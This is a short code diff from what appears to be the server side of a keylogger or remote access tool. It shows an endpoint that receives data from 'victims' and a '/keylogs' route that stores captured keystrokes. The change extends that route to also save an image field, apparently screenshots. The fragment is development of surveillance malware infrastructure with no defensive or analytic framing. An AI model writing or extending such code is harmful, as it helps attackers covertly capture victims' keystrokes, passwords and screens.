@@ -30,7 +30,7 @@ async def connect(victim:Victim, response: Response):
 
 @server.post("/keylogs", status_code=status.HTTP_200_OK, response_class=Response)
 async def keylogs(keylogs:Keylogs,response:Response):
-    db.keylogs.insert_one({"UUID":keylogs.UUID, "logs":keylogs.data, "timeStamp":keylogs.timeStamp})
+    db.keylogs.insert_one({"UUID":keylogs.UUID, "logs":keylogs.data, "timeStamp":keylogs.timeStamp, "img":keylogs.img})
 
 sockets = manager.socketManager()
 
